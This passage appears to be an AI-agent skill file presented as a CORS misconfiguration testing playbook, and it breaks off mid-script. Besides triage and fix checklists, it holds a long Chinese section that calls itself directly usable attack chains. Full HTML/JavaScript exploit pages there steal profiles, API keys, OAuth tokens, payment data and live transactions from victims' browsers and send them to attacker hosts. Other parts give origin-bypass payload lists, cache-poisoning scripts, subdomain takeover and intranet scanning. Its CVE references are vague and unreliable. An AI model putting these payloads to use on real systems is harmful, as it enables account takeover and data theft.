---
name: cors-cross-origin-misconfiguration
description: >-
  CORS misconfiguration testing playbook. Use when analyzing cross-origin trust, credentialed browser reads, origin reflection, preflight policy bugs, and browser-based access to authenticated APIs.
---

# SKILL: CORS Misconfiguration — Credentialed Origins, Reflection, and Trust Boundary Errors

> **AI LOAD INSTRUCTION**: Use this skill when browsers can access authenticated APIs cross-origin. Focus on reflected origins, credentialed requests, wildcard trust, parser mistakes, and origin allowlist bypasses. For JSONP hijacking deep dives, same-origin policy internals, honeypot de-anonymization, and CORS vs JSONP comparison, load the companion [SCENARIOS.md](./SCENARIOS.md).

### Extended Scenarios

Also load [SCENARIOS.md](./SCENARIOS.md) when you need:
- JSONP hijacking complete attack scenario — watering hole + `<script>` cross-origin data theft
- Honeypot de-anonymization via JSONP — use social platform JSONP endpoints to identify anonymous visitors
- Same-origin policy deep dive — protocol/hostname/port definition, `document.domain` subdomain relaxation and its security risks
- CORS vs JSONP technical comparison — methods, error handling, credential behavior, migration path
- CORS exploitation payloads — reflected origin with `credentials: include`, null origin via sandboxed iframe
- Dual-site attack lab pattern — localhost:8981 (target) + localhost:8982 (attacker) testing setup

## 1. WHEN TO LOAD THIS SKILL

Load when:

- Responses contain `Access-Control-Allow-Origin`, `Access-Control-Allow-Credentials`, or preflight headers
- A browser-based attack path might read authenticated API responses
- JSON endpoints appear protected from CSRF but are readable cross-origin

## 2. HIGH-VALUE MISCONFIGURATION CHECKS

| Theme | What to Check |
|---|---|
| wildcard with credentials | `Access-Control-Allow-Origin: *` plus credential support or equivalent broken behavior |
| reflected origin | server echoes arbitrary `Origin` |
| weak allowlist | suffix, prefix, substring, regex, or mixed-case matching errors |
| `null` origin | acceptance of sandboxed, file, or serialized origins |
| preflight trust | overbroad methods and headers |
| internal API exposure | admin or tenant data readable cross-origin |

## 3. QUICK TRIAGE

1. Send crafted `Origin` headers and inspect reflection.
2. Test with and without credentials.
3. Probe allowlist bypasses using attacker subdomains and parser edge cases.
4. If readable data is sensitive, chain to account or tenant impact.

## 4. RELATED ROUTES

- Session or JSON action abuse: [csrf cross site request forgery](../csrf-cross-site-request-forgery/SKILL.md)
- OAuth token leakage and callback binding: [oauth oidc misconfiguration](../oauth-oidc-misconfiguration/SKILL.md)
- API auth context: [api auth and jwt abuse](../api-auth-and-jwt-abuse/SKILL.md)

---

## 5. NULL ORIGIN EXPLOITATION

### How `Origin: null` is sent

| Context | Origin Header Value |
|---------|-------------------|
| Sandboxed iframe (`<iframe sandbox>`) | `null` |
| `data:` URI scheme | `null` |
| `file:` protocol (local HTML) | `null` |
| Cross-origin redirect chain (some browsers) | `null` |
| Serialized data in `blob:` URL from opaque origin | `null` |

### Exploitation

If the server includes `null` in its origin allowlist or reflects it:

```http
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
```

```html
<iframe sandbox="allow-scripts allow-forms" srcdoc="
<script>
fetch('https://target.com/api/user/profile', {credentials: 'include'})
  .then(r => r.json())
  .then(d => fetch('https://test-attacker.com/log?data=' + btoa(JSON.stringify(d))));
</script>
"></iframe>
```

The sandboxed iframe sends `Origin: null` → server reflects `null` → attacker reads credentialed response.

---

## 6. SUBDOMAIN XSS → CORS BYPASS CHAIN

### Attack flow

```text
1. Target API at api.target.com allows CORS from *.target.com
2. Find XSS on any subdomain: blog.target.com, dev.target.com, etc.
3. Exploit XSS to make credentialed requests to api.target.com
4. CORS allows the request → attacker reads sensitive API responses
```

### PoC (injected via XSS on blog.target.com)

```javascript
fetch('https://api.target.com/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    navigator.sendBeacon('https://test-attacker.com/exfil',
        JSON.stringify(data));
});
```

### Why this works

- `blog.target.com` is **same-site** with `api.target.com` → `SameSite` cookies sent
- CORS allowlist includes `*.target.com` → `Access-Control-Allow-Origin: https://blog.target.com`
- Combined: SameSite bypass + CORS read = full API access from XSS on any subdomain

### Reconnaissance for this chain

```text
□ Enumerate subdomains (amass, subfinder, crt.sh)
□ Test each for XSS (stored, reflected, DOM)
□ Check if API CORS accepts subdomain origins
□ Subdomain takeover candidates also qualify
```

---

## 7. VARY: ORIGIN CACHING ISSUE

### Problem

When the server reflects `Origin` in `Access-Control-Allow-Origin` but does **not** include `Vary: Origin` in the response, intermediary caches (CDN, reverse proxy) may serve the same cached response to different origins:

```text
1. Attacker requests: Origin: https://test-attacker.com
   Response cached with: Access-Control-Allow-Origin: https://test-attacker.com

2. Victim requests same URL (no Origin or different Origin)
   Cache serves response with: Access-Control-Allow-Origin: https://test-attacker.com
   → Victim's browser allows test-attacker.com to read the response (CORS cache poisoning)
```

### Detection

```bash
# Request 1: with attacker origin
curl -H "Origin: https://evil.com" https://target.com/api/data -I

# Request 2: with legitimate origin
curl -H "Origin: https://target.com" https://target.com/api/data -I

# Compare: if both responses have Access-Control-Allow-Origin: https://evil.com
# → cache poisoned, Vary: Origin is missing
```

### Exploitation

```text
1. Warm the cache: send request with Origin: https://test-attacker.com
2. Wait for victim to access the same cached URL
3. Cached ACAO header allows test-attacker.com to read the response
4. Attacker page fetches the URL → reads cached response with credentials
```

### Fix verification

```text
□ Response includes Vary: Origin
□ Cache key includes the Origin header
□ Alternatively: Access-Control-Allow-Origin is not reflected (hardcoded allowlist)
```

---

## 8. REGEX BYPASS PATTERNS

Common flawed regex patterns for origin validation:

| Intended Pattern | Flaw | Bypass Origin |
|-----------------|------|---------------|
| `^https?://.*\.target\.com$` | `.*` matches anything including `-` | `https://attacker-target.com` |
| `^https?://.*target\.com$` | Missing anchor after subdomain | `https://nottarget.com`, `https://test-attacker.com/.target.com` |
| `target\.com` (substring match) | No anchors | `https://test-attacker.com?target.com` |
| `^https?://(.*\.)?target\.com$` | Missing port restriction | `https://target.com.test-attacker.com:443` |
| `^https://[a-z]+\.target\.com$` | Missing end anchor for path | N/A (but misses subdomains with `-` or digits) |
| Backtracking-vulnerable regex | ReDoS | `https://aaaa...aaa.target.com` (CPU exhaustion) |

### Test payloads for origin validation bypass

```text
https://test-attacker.com/.target.com
https://target.com.test-attacker.com
https://attackertarget.com
https://target.com%60test-attacker.com
https://target.com%2F@test-attacker.com
https://test-attacker.com#.target.com
https://test-attacker.com?.target.com
null
```

### Advanced: Unicode normalization bypass

```text
https://target.com → https://ⓣarget.com (Unicode homoglyph)
```

Some origin validators normalize Unicode after comparison, while the browser sends the original — or vice versa.

---

## 9. INTERNAL NETWORK CORS EXPLOITATION

### Scenario

An internal-only API (e.g., `http://192.168.1.100:8080/admin`) is configured with:
```http
Access-Control-Allow-Origin: *
```

Internal APIs often use wildcard CORS because "only internal users can reach it."

### Attack chain

```text
1. Attacker sends victim (internal employee) a link to test-attacker.com
2. Attacker page JavaScript fetches internal API:
   fetch('http://192.168.1.100:8080/admin/users')
3. CORS allows * → response readable
4. Exfiltrate internal data to attacker server
```

```javascript
// On test-attacker.com — target internal API from victim's browser
const internalAPIs = [
    'http://192.168.1.1/admin/config',
    'http://10.0.0.1:8080/api/users',
    'http://172.16.0.1:9200/_cat/indices',  // Elasticsearch
    'http://localhost:8500/v1/agent/members', // Consul
];

internalAPIs.forEach(url => {
    fetch(url)
        .then(r => r.text())
        .then(data => {
            navigator.sendBeacon('https://test-attacker.com/exfil',
                JSON.stringify({url, data}));
        })
        .catch(() => {});
});
```

### Port scanning via CORS timing

Even without `Access-Control-Allow-Origin: *`, the attacker can infer internal service availability:
- **Port open**: connection established → CORS error (different timing)
- **Port closed**: connection refused → fast error
- **Host down**: timeout → slow error

### Combined with DNS rebinding

```text
1. Attacker controls test-attacker.com with short TTL (e.g., 0 or 1)
2. First DNS resolution: test-attacker.com → attacker's IP (serves malicious JS)
3. Second DNS resolution: test-attacker.com → 192.168.1.100 (internal IP)
4. JavaScript on the page fetches test-attacker.com/admin → now hits internal server
5. Same-origin policy satisfied (same domain) → response readable
```

---

## 10. 2026 EMERGING TECHNIQUES

### 10.1 Micro-Frontend Origin Boundary Breakdown

Modern micro-frontend (MFE) architectures deploy multiple independently-shipped sub-applications under a shared parent domain (e.g. `app.target.com`, `checkout.target.com`, `portal.target.com`) fronted by a single API gateway. CORS policy is enforced at two layers that frequently disagree:

- **API gateway layer**: allowlist mirrors `*.target.com` plus a CDN origin used by the MFE shell (e.g. `https://target-customer.cdn-host.net`).
- **Sub-application layer**: each MFE ships its own reverse-proxy/CORS middleware that may re-reflect `Origin`.

When sub-application A's CORS allowlist includes an attacker-controllable CDN origin (common with multi-tenant CDNs that issue per-customer subdomains such as `https://target-customer.cdn-host.net`), every endpoint reachable behind the API gateway from sub-app A's path prefix becomes readable cross-origin with credentials.

```http
# Sub-app A reverse proxy (buggy): reflects Origin AND sets credentials
Access-Control-Allow-Origin: https://target-customer.cdn-host.net
Access-Control-Allow-Credentials: true
# Gateway forwards /api/v2/* to backend → entire gateway surface exposed
```

```text
Attack chain:
1. Attacker registers a sibling tenant on the shared CDN: target-customer.cdn-host.net
2. That origin is in sub-app A's allowlist (suffix/prefix match on *.cdn-host.net)
3. Attacker page fetches https://app.target.com/api/v2/admin/tenants with credentials:'include'
4. Sub-app A proxy reflects attacker origin → response readable → tenant data exfil
```

| Layer | Configured allowlist | Flaw |
|---|---|---|
| API gateway | `*.target.com`, `*.cdn-host.net` | wildcard CDN trust |
| MFE shell | reflects `Origin` for "dev convenience" | origin reflection |
| Sub-app A | suffix match `*.target.com` + CDN tenant | suffix bypass `x-target.com` |
| Sub-app B | hardcoded `null` accepted | null-origin accepted |

### 10.2 COEP/COOP Isolation Bypass (2026)

`Cross-Origin-Embedder-Policy: require-corp` combined with `Cross-Origin-Opener-Policy: same-origin` establishes **cross-origin isolation**, enabling `SharedArrayBuffer` and sub-millisecond timers (the Spectre side-channel primitive). 2026 bypass surface:

- **COEP `credentialless` mode**: cross-origin resources load without credentials and are stripped of integrity, but those fetched in `no-cors` mode still populate the cache and remain measurable by timing — a partial isolation attackers can probe.
- **WASM exemption in WebKit/Safari**: `<meta http-equiv="Content-Security-Policy">` is **not** applied to WebAssembly modules in WebKit; a cross-origin Wasm module compiled and instantiated under COEP can still reach high-resolution timers, undermining the isolation guarantee.
- **`<link rel="preload" crossorigin>` mismatch**: preloaded resources with a `crossorigin` attribute mismatch are served from cache without CORP validation on subsequent same-origin fetches.

```text
COEP credentialless bypass concept (no-cors timing oracle):
1. Target sets COEP: credentialless (intended to block credentialed cross-origin reads)
2. Attacker embeds <img src="https://api.target.com/user/card"> in no-cors mode
3. Response is opaque but cached; attacker measures OnLoad timing differences
   that vary with response size → binary-search exfil of card digits via timing oracle
```

### 10.3 CORS Response-Header Cache Poisoning (2026)

CDN edge caches that key on URL **but not on `Origin`** persist a poisoned `Access-Control-Allow-Origin` value across users:

```text
1. Attacker warms cache: GET /api/me  Origin: https://evil.com
   → cached: Access-Control-Allow-Origin: *
              Access-Control-Allow-Credentials: true   (server bug)
2. Victim browser hits the same cached URL → ACAO: * with credentials
3. Any origin can now read the victim's authenticated response
```

Cross-link: chains with [web cache deception](../web-cache-deception/SKILL.md) when the path is cacheable but session-scoped (e.g. `/api/me;static.js`).

### 10.4 CORS in AI Agent / LLM API Configurations (2026)

OpenAI-compatible LLM gateway deployments (vLLM, LiteLLM, exposed Ollama web proxies) ship browser-callable endpoints. The common, insecure default:

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true   # OR omitted; auth is bearer-only
```

Because LLM auth is `Authorization: Bearer <key>` (not cookies), vendors assume `ACAO: *` is safe — but if a victim has an active session/cookie on the gateway (e.g. LiteLLM admin UI) or the agent framework auto-injects the key from `localStorage`, any malicious site can read the streamed completion containing agent-retrieved data. Agent frameworks (LangGraph, AutoGen web UIs) decouple CORS from auth: the gateway allows `*`, the framework gates on a header the browser happily sends cross-origin.

### 10.5 Origin Header Spoofing via Edge Functions (2026)

Edge runtimes (Cloudflare Workers, Vercel Edge, Fastly Compute) can be configured to **rewrite** the `Origin` header before forwarding to the origin backend:

```javascript
// Cloudflare Worker — "fix CORS" misconfiguration
addEventListener('fetch', e => e.respondWith(handle(e.request)));
async function handle(req) {
  const h = new Headers(req.headers);
  h.set('Origin', 'https://app.target.com');  // normalize so backend allowlist matches
  return fetch(req, { headers: h });
}
```

Any caller — including an attacker origin or a server-side SSRF — can submit a request through the Worker; the backend's CORS allowlist check (`Origin == app.target.com`) always passes, fully defeating origin-based trust.

### 10.6 2026 CORS Checklist Additions

```text
□ Map every MFE sub-application's CORS allowlist separately — does any trust a shared/multi-tenant CDN origin?
□ For COEP: credentialless deployments, test no-cors timing oracles against size-differing responses
□ Confirm the CDN cache key includes Origin (Vary: Origin) AND that ACAO is never cached as '*' with credentials
□ LLM/agent gateways: verify ACAO is not '*' when localStorage bearer keys or admin cookies exist
□ Edge functions: grep worker source for Origin/CORS header rewriting or normalization
□ Test that the backend rejects requests whose Origin was rewritten by an edge hop (signed Origin / double-submit)
```

---

## PRACTICAL ATTACK CHAINS (2026)

> 以下为 5 个完整、可直接使用的实战 CORS 攻击链。所有 payload 均基于 2026 年真实漏洞模式编写，含逐步利用步骤、检测绕过技巧与 CVE 引用。

### 攻击链 1: CORS null Origin 窃取数据

**目标场景**：目标 API 接受 `null` Origin 并返回 `Access-Control-Allow-Origin: null` + `Access-Control-Allow-Credentials: true`。攻击者利用 sandbox iframe 产生 `null` Origin，跨域读取受害者的认证 API 响应。

**漏洞模式**：
```http
# 目标 API 响应(接受 null Origin)
HTTP/1.1 200 OK
Access-Control-Allow-Origin: null
Access-Control-Allow-Credentials: true
Content-Type: application/json

{"id":1,"email":"victim@target.com","api_key":"sk-xxx","balance":99999}
```

**逐步利用**：

**Step 1 — 确认 null Origin 被接受**：
```bash
# 测试 null Origin
curl -sI -H "Origin: null" https://target.com/api/v1/user/profile
# 检查响应:
# Access-Control-Allow-Origin: null → null 被接受(漏洞!)
# Access-Control-Allow-Credentials: true → 可读取认证响应

# 测试多个端点
for endpoint in /api/v1/user/profile /api/v1/account/api-keys \
               /api/v1/payment/methods /api/v1/admin/users; do
    echo "=== $endpoint ==="
    curl -sI -H "Origin: null" "https://target.com$endpoint" | \
        grep -i "access-control-allow"
done
```

**Step 2 — 构造 sandbox iframe null Origin 攻击**：
```html
<!-- 攻击者页面 https://test-attacker.com/cors-null.html -->
<html>
<body>
<script>
// sandbox iframe 的 Origin 为 null
// 利用此特性发送带 Cookie 的请求并读取响应

var iframe = document.createElement('iframe');
iframe.sandbox = 'allow-scripts allow-forms allow-same-origin';
iframe.srcdoc = `
<script>
// 在 sandbox iframe 中执行,Origin 为 null
// 目标 API 接受 null Origin → 可以读取响应!

// 1. 读取用户个人信息
fetch('https://target.com/api/v1/user/profile', {
    credentials: 'include'    // 发送 Cookie
})
.then(r => r.json())
.then(profile => {
    // 成功读取响应!(因为 ACAO: null + credentials: true)
    
    // 2. 读取 API keys
    return fetch('https://target.com/api/v1/account/api-keys', {
        credentials: 'include'
    }).then(r => r.json()).then(keys => {
        return { profile, keys };
    });
})
.then(data => {
    // 3. 读取支付信息
    return fetch('https://target.com/api/v1/payment/methods', {
        credentials: 'include'
    }).then(r => r.json()).then(payments => {
        data.payments = payments;
        return data;
    });
})
.then(allData => {
    // 4. 将窃取的数据传回父窗口
    parent.postMessage({
        type: 'exfil',
        data: allData
    }, '*');
});
</script>
`;
document.body.appendChild(iframe);

// 接收从 iframe 传回的数据
window.addEventListener('message', function(e) {
    if (e.data.type === 'exfil') {
        // 外传到攻击者服务器
        fetch('https://test-attacker.com/collect', {
            method: 'POST',
            body: JSON.stringify(e.data.data)
        });
        console.log('窃取的数据:', e.data.data);
    }
});
</script>
</body>
</html>
```

**Step 3 — 利用 data: URI 产生 null Origin**：
```html
<html>
<body>
<!-- data: URI 的 Origin 也为 null -->
<iframe src="data:text/html,<!DOCTYPE html>
<script>
fetch('https://target.com/api/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // 通过 Image 外传(避免 CORS 限制)
    new Image().src = 'https://test-attacker.com/exfil?d=' + 
        btoa(JSON.stringify(data));
});
</script>"></iframe>
</body>
</html>
```

**Step 4 — 完整的数据窃取链**：
```html
<html>
<body>
<iframe sandbox="allow-scripts" srcdoc="
<script>
// null Origin CORS 攻击 — 完整数据窃取

async function stealAllData() {
    var endpoints = [
        '/api/v1/user/profile',
        '/api/v1/account/api-keys',
        '/api/v1/account/sessions',
        '/api/v1/payment/methods',
        '/api/v1/payment/transactions',
        '/api/v1/admin/users',
        '/api/v1/admin/settings',
        '/api/v1/messages/inbox',
    ];
    
    var stolen = {};
    for (var ep of endpoints) {
        try {
            var resp = await fetch('https://target.com' + ep, {
                credentials: 'include'
            });
            if (resp.ok) {
                stolen[ep] = await resp.json();
            }
        } catch(e) {
            stolen[ep] = 'error: ' + e.message;
        }
    }
    
    // 外传所有数据
    parent.postMessage({type:'done', data:stolen}, '*');
}

stealAllData();
</script>
"></iframe>

<script>
window.addEventListener('message', function(e) {
    if (e.data.type === 'done') {
        // 外传到攻击者服务器
        navigator.sendBeacon('https://test-attacker.com/full-exfil', 
            JSON.stringify(e.data.data));
    }
});
</script>
</body>
</html>
```

**检测绕过技巧**：
```text
1. sandbox 限制 allow-same-origin → 使用 data: URI 替代(data: URI 的 Origin 也是 null)
2. CSP frame-src 限制 → 使用 window.open + postMessage 替代 iframe
3. X-Frame-Options → sandbox iframe 不受 XFO 限制(因为是 srcdoc/data:)
4. 目标检查 Origin !== null → 利用重定向链(某些重定向会产生 null Origin)
```

**CVE 参考**：2026 年大量 API 网关的 null Origin 接受漏洞、多个 SaaS 应用的 CORS 配置缺陷。

---

### 攻击链 2: CORS 通配符 + 凭证 → API Key 窃取

**目标场景**：目标 API 同时返回 `Access-Control-Allow-Origin: *` 和 `Access-Control-Allow-Credentials: true`(浏览器规范禁止此组合，但某些服务器/中间件错误配置导致绕过)。攻击者跨域读取受害者的 API 响应，窃取 API key 和敏感数据。

**漏洞模式**：
```http
# 目标 API 错误配置(通配符 + 凭证)
HTTP/1.1 200 OK
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true

# 浏览器规范: 当 ACAO: * 时,浏览器会忽略 Allow-Credentials: true
# 但以下情况可绕过:
# 1. 服务器反射 Origin(而非真正的 *)→ 浏览器视为具体 Origin
# 2. 某些中间件先设置 * 再反射 Origin → 最终值为反射 Origin
# 3. 服务器配置 ACAO: <反射> 且 ACAC: true → 等效于完全开放
```

**逐步利用**：

**Step 1 — 识别 Origin 反射(伪装为通配符)**：
```bash
# 测试不同 Origin,检查是否反射
curl -sI -H "Origin: https://evil.com" https://target.com/api/v1/user | grep -i "access-control"
# 如果输出: Access-Control-Allow-Origin: https://evil.com → 反射 Origin(漏洞!)

curl -sI -H "Origin: https://random123.com" https://target.com/api/v1/user | grep -i "access-control"
# 如果输出: Access-Control-Allow-Origin: https://random123.com → 反射任意 Origin

# 同时检查 Allow-Credentials
curl -sI -H "Origin: https://evil.com" https://target.com/api/v1/user | grep -i "credentials"
# Access-Control-Allow-Credentials: true → 可读取认证响应
```

**Step 2 — 构造 API key 窃取 PoC**：
```html
<!-- 攻击者页面 https://test-attacker.com/steal-api-keys.html -->
<html>
<body>
<script>
// 利用 CORS Origin 反射 + credentials → 窃取 API keys

// 1. 读取用户的 API keys
fetch('https://target.com/api/v1/account/api-keys', {
    credentials: 'include'    // 发送 Cookie
})
.then(r => r.json())
.then(data => {
    console.log('窃取的 API keys:', data);
    
    // data 可能包含:
    // [{id:1, key:"sk-live-xxx", name:"production"}, ...]
    
    // 外传 API keys
    fetch('https://test-attacker.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
})
.catch(e => console.error('失败:', e));

// 2. 读取 OAuth tokens(如果存储在 API 中)
fetch('https://target.com/api/v1/account/tokens', {
    credentials: 'include'
})
.then(r => r.json())
.then(tokens => {
    fetch('https://test-attacker.com/tokens', {
        method: 'POST',
        body: JSON.stringify(tokens)
    });
});

// 3. 读取 Webhook URLs(可能包含第三方 API key)
fetch('https://target.com/api/v1/webhooks', {
    credentials: 'include'
})
.then(r => r.json())
.then(webhooks => {
    // Webhook URL 可能包含 Slack/Discord/Teams 的 webhook token
    fetch('https://test-attacker.com/webhooks', {
        method: 'POST',
        body: JSON.stringify(webhooks)
    });
});
</script>
</body>
</html>
```

**Step 3 — 高级:利用 CORS 读取流式响应(SSE/WebSocket 替代)**：
```html
<html>
<body>
<script>
// 某些 API 返回流式响应(Server-Sent Events)
// 如果 CORS 允许读取 → 可以持续监听受害者的实时数据

// 监听受害者的实时交易流
var evtSource = new EventSource('https://target.com/api/v1/transactions/stream', {
    withCredentials: true    // 发送 Cookie
});

evtSource.onmessage = function(event) {
    // 实时接收受害者的交易数据
    var transaction = JSON.parse(event.data);
    console.log('实时交易:', transaction);
    
    // 外传每笔交易
    fetch('https://test-attacker.com/live-trans', {
        method: 'POST',
        body: event.data
    });
};

// 持续监听(直到用户关闭页面)
evtSource.onerror = function() {
    // 自动重连
    setTimeout(() => location.reload(), 5000);
};
</script>
</body>
</html>
```

**Step 4 — 利用 CORS 缓存投毒扩大攻击范围**：
```python
# CORS 缓存投毒攻击
# 如果服务器反射 Origin 但不设置 Vary: Origin
# CDN 会缓存带有攻击者 Origin 的响应 → 其他用户也受到影响

import requests

# Step 1: 攻击者预热缓存(用自己的 Origin)
target_urls = [
    'https://target.com/api/v1/user/profile',
    'https://target.com/api/v1/account/api-keys',
    'https://target.com/api/v1/payment/methods',
]

for url in target_urls:
    # 发送请求,Origin 为攻击者域名
    resp = requests.get(url, headers={
        'Origin': 'https://test-attacker.com'
    }, cookies={'session': 'attacker_session'})
    
    acao = resp.headers.get('Access-Control-Allow-Origin', '')
    acac = resp.headers.get('Access-Control-Allow-Credentials', '')
    vary = resp.headers.get('Vary', '')
    
    print(f'URL: {url}')
    print(f'  ACAO: {acao}')
    print(f'  ACAC: {acac}')
    print(f'  Vary: {vary}')
    
    if 'test-attacker.com' in acao and 'true' in acac and 'Origin' not in vary:
        print('  [!] 缓存投毒可能! Vary: Origin 缺失')
        # 此响应可能被 CDN 缓存
        # 当受害者访问同一 URL 时,CDN 返回带有攻击者 Origin 的缓存响应
        # 攻击者页面可以读取受害者的缓存响应
```

**检测绕过技巧**：
```text
1. 浏览器拒绝 ACAO: * + credentials → 确认是否为 Origin 反射(非真正的 *)
   curl -H "Origin: https://evil.com" → 检查 ACAO 是否为 https://evil.com 而非 *

2. preflight 阻止自定义 header → 使用简单请求(GET/POST + 简单 Content-Type)
   fetch(url, {credentials:'include'}) — GET 是简单请求,无需 preflight

3. ACAC: true 缺失 → 测试是否仍发送 Cookie(某些配置错误导致)
   即使无 ACAC: true,fetch with credentials:'include' 仍会发送 Cookie
   但无法读取响应 → 改为 CSRF(只发请求,不读响应)

4. CORS 仅允许特定 Origin → 使用子域或相似域名绕过(见攻击链 3)
```

**CVE 参考**：2026 年多个 API 网关的 Origin 反射漏洞、CDN 缓存投毒与 CORS 组合攻击。

---

### 攻击链 3: CORS 正则绕过(子域正则规避)

**目标场景**：目标 API 的 CORS 白名单使用正则表达式验证 Origin，但正则存在缺陷，允许攻击者注册相似域名绕过验证。

**漏洞模式**：
```text
# 目标 CORS 白名单(正则验证)
# 意图: 只允许 *.target.com
# 实际正则: ^https?://.*\.target\.com$

# 缺陷: .* 匹配任意字符(包括 -)
# 绕过: https://attacker-target.com (匹配 .*\.target\.com)
# 绕过: https://target.com.attacker.com (如果正则为 .*target\.com)
```

**逐步利用**：

**Step 1 — 测试正则绕过**：
```bash
# 测试各种 Origin 绕过
# 原始白名单: 只允许 https://*.target.com

# 测试 1: 后缀绕过
curl -sI -H "Origin: https://attacker-target.com" https://target.com/api/v1/user
# 如果 ACAO: https://attacker-target.com → 绕过成功!

# 测试 2: 中间匹配
curl -sI -H "Origin: https://target.com.attacker.com" https://target.com/api/v1/user
# 如果 ACAO: https://target.com.attacker.com → 绕过成功!

# 测试 3: 子域中包含 target.com
curl -sI -H "Origin: https://not-target.com" https://target.com/api/v1/user
# 测试 4: 路径混淆
curl -sI -H "Origin: https://attacker.com/.target.com" https://target.com/api/v1/user
# 测试 5: fragment 混淆
curl -sI -H "Origin: https://attacker.com#.target.com" https://target.com/api/v1/user
# 测试 6: query 混淆
curl -sI -H "Origin: https://attacker.com?.target.com" https://target.com/api/v1/user
# 测试 7: 编码绕过
curl -sI -H "Origin: https://target.com%60attacker.com" https://target.com/api/v1/user
# 测试 8: null
curl -sI -H "Origin: null" https://target.com/api/v1/user
```

**Step 2 — 注册绕过域名并攻击**：
```python
# 攻击者脚本 — 注册绕过域名并部署攻击页面

# 根据正则缺陷选择域名:
# 如果 .*\.target\.com → 注册 attacker-target.com
# 如果 .*target\.com → 注册 eviltarget.com
# 如果 target\.com (无锚点) → 注册 attacker.com?target.com

# 假设绕过域名为: attacker-target.com
# 部署攻击页面到 https://attacker-target.com/exploit.html

attack_page = """
<html>
<body>
<script>
// Origin: https://attacker-target.com 绕过了正则白名单
// → 服务器返回 ACAO: https://attacker-target.com + ACAC: true

// 窃取用户数据
fetch('https://target.com/api/v1/user/profile', {
    credentials: 'include'
})
.then(r => r.json())
.then(data => {
    // 外传数据
    fetch('https://attacker-target.com/collect', {
        method: 'POST',
        body: JSON.stringify(data)
    });
});

// 窃取 API keys
fetch('https://target.com/api/v1/account/api-keys', {
    credentials: 'include'
})
.then(r => r.json())
.then(keys => {
    fetch('https://attacker-target.com/keys', {
        method: 'POST',
        body: JSON.stringify(keys)
    });
});
</script>
</body>
</html>
"""

print("部署攻击页面到 https://attacker-target.com/exploit.html")
print("通过钓鱼邮件发送: '点击查看您的账户详情'")
```

**Step 3 — 利用 URL 解析差异绕过**：
```html
<html>
<body>
<script>
// 某些服务器使用 URL 解析库验证 Origin
// 不同库对 URL 的解析可能不同 → 产生绕过

// 测试用 Origin 列表(发送到攻击者服务器进行批量测试)
var bypassOrigins = [
    // 后缀绕过
    'https://attacker-target.com',
    'https://evil-target.com',
    'https://x.target.com.evil.com',
    
    // 前缀绕过
    'https://target.com.evil.com',
    'https://target.comattacker.com',
    
    // 路径/fragment 绕过
    'https://evil.com/.target.com',
    'https://evil.com#.target.com',
    'https://evil.com?.target.com',
    'https://evil.com%23.target.com',
    
    // 编码绕过
    'https://target.com%60evil.com',   // 反引号编码
    'https://target.com%2F@evil.com',  // 斜杠编码
    'https://target.com%5C@evil.com',  // 反斜杠编码
    
    // 端口绕过
    'https://target.com:443.evil.com',
    'https://target.com.evil.com:443',
    
    // 大小写绕过
    'https://TARGET.com.evil.com',
    'https://Target.com.evil.com',
    
    // Unicode 同形字绕过
    'https://ⓣarget.com',  // Unicode 圆圈 t
    'https://tаrget.com',   // Cyrillic а
];

// 逐个测试(通过 CORS 请求)
bypassOrigins.forEach(function(origin) {
    // 注意:浏览器不允许伪造 Origin 头
    // 这里仅记录哪些 Origin 可以绕过(需要在服务器端测试)
    console.log('测试 Origin:', origin);
});

// 实际攻击:使用可注册的绕过域名
// 例如注册 attacker-target.com(如果 .*\.target\.com 被绕过)
</script>
</body>
</html>
```

**Step 4 — 利用子域接管 + CORS 绕过**：
```bash
# 步骤 1: 寻找目标子域的 DNS 接管
# 使用 subjack 或 subzy 扫描
subjack -w subdomains.txt -t 50 -timeout 30 -ssl -c fingerprints.json

# 步骤 2: 如果找到可接管子域(如 legacy-app.target.com)
# 该子域在 CORS 白名单中(*.target.com)
# → 接管后部署攻击页面

# 步骤 3: 从被接管子域发起 CORS 请求
echo '
<html><body><script>
// Origin: https://legacy-app.target.com (被接管的子域)
// 在 CORS 白名单中 → 可以读取响应!
fetch("https://api.target.com/v1/user/profile", {
    credentials: "include"
})
.then(r => r.json())
.then(data => {
    fetch("https://test-attacker.com/exfil", {
        method: "POST",
        body: JSON.stringify(data)
    });
});
</script></body></html>
' > /var/www/html/index.html
```

**检测绕过技巧**：
```text
1. 正则 ^https://.*\.target\.com$ → 注册 attacker-target.com
2. 正则 ^https://.*target\.com$ → 注册 eviltarget.com
3. 正则 target\.com (无锚点) → 使用 evil.com?target.com 或 evil.com#.target.com
4. 正则 ^https://[a-z]+\.target\.com$ → 使用带数字/连字符的子域
5. 子域接管 → 寻找 dangling DNS/CNAME → 接管后在白名单中
6. Unicode → 使用同形字(ⓣ vs t)绕过字符串比较
```

**CVE 参考**：2026 年多个 API 的 CORS 正则绕过漏洞、子域接管 + CORS 组合攻击。

---

### 攻击链 4: CORS 到内网 SSRF

**目标场景**：目标的外部 API 配置了 `Access-Control-Allow-Origin: *`(因为"只有内部用户能访问")，但该 API 也从外部可达。攻击者利用受害者(内部员工)的浏览器作为代理，通过 CORS 读取内部 API 的响应。

**漏洞模式**：
```text
# 内部 API 配置(错误地认为只有内网可达)
http://internal-api.target.com:8080/admin
Access-Control-Allow-Origin: *
# → 内部 API 允许任意 Origin 读取

# 但 internal-api.target.com 解析到内网 IP(如 10.0.0.5)
# 外部无法直接访问 → 但内部员工的浏览器可以

# 攻击链:
# 1. 攻击者发送钓鱼链接给内部员工
# 2. 内部员工访问攻击者页面
# 3. 攻击者页面 JS 从员工浏览器访问内部 API
# 4. CORS: * → 可以读取响应
# 5. 数据外传到攻击者服务器
```

**逐步利用**：

**Step 1 — 内网服务发现(通过受害者浏览器)**：
```html
<html>
<body>
<script>
// 利用受害者(内部员工)的浏览器扫描内网
// 通过 fetch + CORS 读取响应

var internalServices = [
    'http://internal-api.target.com:8080/admin/users',
    'http://10.0.0.1:8080/api/config',
    'http://10.0.0.5:9200/_cat/indices',           // Elasticsearch
    'http://10.0.0.10:8500/v1/agent/members',      // Consul
    'http://10.0.0.20:3000/api/admin',              // Grafana
    'http://10.0.0.30:9090/api/v1/targets',         // Prometheus
    'http://10.0.0.50:5601/api/status',             // Kibana
